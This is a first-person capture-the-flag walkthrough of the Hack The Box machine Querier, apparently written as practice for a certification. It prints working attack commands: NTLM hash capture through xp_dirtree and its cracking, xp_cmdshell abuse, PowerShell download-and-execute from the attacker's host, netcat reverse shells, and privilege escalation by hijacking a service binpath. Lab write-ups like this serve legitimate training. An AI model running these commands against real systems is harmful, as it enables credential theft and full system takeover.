### HTB Querier   10.10.10.125

Welcome back to another HTB takedown.  This time we're going after Querier.

So let's get started.  Once again, as always, the good ol nmap.

```
(kali@kali)-$ sudo nmap -T4 -p- -Pn 10.10.10.125                        
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 08:38 EST
Nmap scan report for 10.10.10.125
Host is up (0.058s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 36.97 seconds
```

A couple of ports to peed at, let's give those a go.

```
(kali@kali)-$ sudo nmap -A -Pn -p 135,139,445,1433,5985,47001 10.10.10.125
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 08:40 EST
Nmap scan report for 10.10.10.125
Host is up (0.049s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.125:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-06T13:34:15
|_Not valid after:  2054-11-06T13:34:15
|_ssl-date: 2024-11-06T13:40:41+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 1709 - 1909 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 10 1703 (91%), Microsoft Windows 7 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-06T13:40:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   43.17 ms 10.10.14.1
2   56.81 ms 10.10.10.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.31 seconds
```

So, looks like we have SMB and SQL.  Let's try smb first.

```
(kali@kali)-$ smbclient -L \\\\10.10.10.125\\    
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

Looks like Reports is the one we're gonna take a look at.  Of course, try them all but Reports looks like our winner.

```
(kali@kali)-$ smbclient \\\\10.10.10.125\\Reports
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

                5158399 blocks of size 4096. 826798 blocks available
smb: \> cd ..
smb: \> pwd
Current directory is \\10.10.10.125\Reports\
smb: \> cd ..
smb: \> pwd
Current directory is \\10.10.10.125\Reports\
smb: \> get Currency Volume Report.xlsm 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Currency
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (53.8 KiloBytes/sec) (average 53.8 KiloBytes/sec)
```

And it was.  Went ahead and grabbed the file that was there.  And this was where I got stuck and had to go look.  So turns out, you can unzip .xlsm files.  So did that and what I got was this...

```
(kali@kali)-$ unzip Currency\ Volume\ Report.xlsm                        
Archive:  Currency Volume Report.xlsm
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/vbaProject.bin       
  inflating: docProps/core.xml       
  inflating: docProps/app.xml
```

In a pentest, we would look through all of these, and I did.  I found an assortment of things in the xml files but nothing caught my eye.  So, stuck again, I went back to the video to find another trick I didn't know about.  HTB had me do the `strings` command on the .bin file.  The video had me `cat` out the file.  The `string` command gave it to me in a long skinny string of text while the `cat` command printed it out much more readable.  I think I like the `cat` command better.

![cat bin file](/Images/HTB9Querier/pic1.png)

Here we have the a Uid and a Pwd.  Let's see where that gets us.  I remember we had a ms-sql server running.  Let's give that a go.

```
(kali@kali)-$ mssqlclient.py QUERIER/reporting:'<password>'@10.10.10.125 -windows-auth                   
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

So we used `mssqlclient.py` with the domain/username with the password that we grabbed @ the IP address.  Then we specified the `-windows-auth` as our login type.  And that got us in here.

At this point, tried running `enable_xp_cmdshell` and it did not work.

```
SQL> enable_xp_cmdshell
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL> 
```

So looks like we don't have permission for that.  But what we can also try is this.

```
(kali@kali)-$ smbserver.py -smb2support share share/
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
```

So we start up an SMB server on our machine.  And using the same principle as responder to grab hash credentials, we can initiate a connection from the sql server.

```
SQL> exec xp_dirtree '\\10.10.14.31\share'
subdirectory                                                                                                                                                                                                                                                            depth   
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   
```

Once we run that command, go back to the smb server running and we see the following.

![Hash](/Images/HTB9Querier/pic2.png)

And we have our NTLMv2 hash.

Now that we have a hash, we can go one of a couple ways.  We can use hash cat or any number of hash cracking tools.  Take the hash and save it into a text file.

To use John the Ripper, we do the following.

`john --format=netntlmv2 ntlmhash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

This gives us the following output.

![John result](/Images/HTB9Querier/pic3.png)

We can also use HashCat.

`hashcat-6.2.6>hashcat.exe hash.txt rockyou.txt -O`

![Hashcat Result](/Images/HTB9Querier/pic4.png)

Took a sec to get hashcat working, had to try a few different ways but got it to work.

Once that went through, now we can try the new creds we got from the hash.

![mssql-svc account](/Images/HTB9Querier/pic5.png)

And we have a connection.  Now, we can try some psexec and different things but if this account isn't an admin level account then it's not really going to give anything.

Now that we've gotten in, let's give the `enable_xp_cmdshell` again and see what we get.

```
SQL> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell dir C:\
output                                                                             
--------------------------------------------------------------------------------   
 Volume in drive C has no label.                                                   
 Volume Serial Number is 35CB-DA81                                                 
NULL                                                                               
 Directory of C:\                                                                  
NULL                                                                               
09/15/2018  07:19 AM    <DIR>          PerfLogs                                    
01/28/2019  11:55 PM    <DIR>          Program Files                               
01/29/2019  12:02 AM    <DIR>          Program Files (x86)                         
01/28/2019  11:23 PM    <DIR>          Reports                                     
01/28/2019  11:41 PM    <DIR>          Users                                       
01/29/2019  06:15 PM    <DIR>          Windows                                     
               0 File(s)              0 bytes                                      
               6 Dir(s)   3,385,180,160 bytes free                                 
NULL                                                                               
```

Looks like now we can execute shell commands from our SQL connection.  Using `xp_cmdshell` command, we can put our command in and where we want to execute that command.  Like so:

![user flag](/Images/HTB9Querier/pic6.png)

And we have the user flag.  Now onto the elevation.

So, now that we're here, I want to get a better shell to work with.  So, in order to do that, I'm going to upload netcat to this device and then use the `xp_cmdshell` command in order to get myself a reverse shell going.

So tried the certutil command and it didn't work so found a powershell command to use.

`SQL> xp_cmdshell powershell -c Invoke-WebRequest "http://10.10.14.31/nc.exe" -OutFile "C:\Reports\nc.exe"`

That got the transfer to go and now I have the nc.exe file on the victim device.

![SMB nc.exe](/Images/HTB9Querier/pic7.png)

Now that the file has been moved, lets get our shell.  Start up our netcat listener on our device and then on the sql device, we run the following.

`SQL> xp_cmdshell C:\Reports\nc.exe 10.10.x.x 4444 -e cmd.exe`

Again, the IP should be whatever the IP of your device is.  The `-e cmd.exe` is to execute cmd.exe.  Run that and now we have our nice neat shell.  Don't feel quite so nekid now.

![Clean Shell](/Images/HTB9Querier/pic8.png)

Now that we're here, we want to verify that PowerUp.ps1 has the endline `Invoke-AllChecks` and then use a Powershell line that we've used before to download and run it.

`echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.x.x:80/PowerUp.ps1') | powershell -noprofile -`

Once that runs, we see a couple different items but the one that catches my eye is the one towards the end.

![PowerUp.ps1 Result](/Images/HTB9Querier/pic9.png)

Unless my eyes decieve me, that's the admin password!!  And we now own this device.  Use that username and password to connect to the sql server, use the `xp_cmdshell` function to grab this flag but at this point, we own this device with the admin password.

So let's hop over to SMB and grab the flag.

Get connected to SMB, try to cd over to the Administrator folder in Users and.....wait, what's this?

![denied!!](/Images/HTB9Querier/pic10.png)

Ok, well, let's go look at the PowerUp.ps1 output again.

![PowerUp Output 2](/Images/HTB9Querier/pic11.png)

We also have this service name that we can modify.  Since I've already got netcat moved over let's try this.  We've done this before too.  Start up a nc listener on our device, make sure to use a different port than any previous/currently used ones.

```
C:\Reports>sc qc UsoSvc
sc qc UsoSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: UsoSvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem

C:\Reports>sc config UsoSvc binpath= "C:\Reports\nc.exe 10.10.x.x 5555 -e cmd.exe"
sc config UsoSvc binpath= "C:\Reports\nc.exe 10.10.x.x 5555 -e cmd.exe"
[SC] ChangeServiceConfig SUCCESS

C:\Reports>sc qc UsoSvc
sc qc UsoSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: UsoSvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Reports\nc.exe 10.10.x.x 5555 -e cmd.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem

C:\Reports>sc stop UsoSvc
sc stop UsoSvc

SERVICE_NAME: UsoSvc 
        TYPE               : 30  WIN32  
        STATE              : 3  STOP_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x7530

C:\Reports>sc start UsoSvc
sc start UsoSvc
```

And then we check our nc listener and.....

![NT Auth/Sys](/Images/HTB9Querier/pic12.png)

And there we go.  We now have root!  This one took a couple new twists and turns.  Learned some new things on this one too.  The ms-sql stuff was something I wasn't as familiar with but will definitely keep that in my handy dandy trick book.

Thanks for coming along.  This was all for the PNPT Windows priv escalation side.  Now onto the Linux side of things.  Until next time my friends :D







